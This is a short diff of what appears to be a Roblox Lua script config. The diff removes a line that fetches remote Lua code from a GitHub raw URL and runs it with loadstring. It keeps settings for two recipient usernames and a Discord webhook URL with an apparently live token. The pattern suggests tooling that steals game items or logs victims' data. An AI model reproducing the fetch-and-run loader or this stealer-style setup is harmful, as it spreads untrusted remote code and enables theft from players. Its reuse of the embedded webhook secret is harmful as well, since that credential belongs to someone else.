@@ -1,6 +1,3 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/e692940f8b12903eebee64e4.lua'))()
-
-ps99:
 Username = "himynameisthomash"
 Username2 = "himynameisthomash"
 webhook = "https://discord.com/api/webhooks/1316574103632871424/HRJ48jsTR4Zldcv-5dwX8uv6ZBDqPA_22TJ_SH5zJbBKs-x12BlebzLtY5qibmF-BrE6"
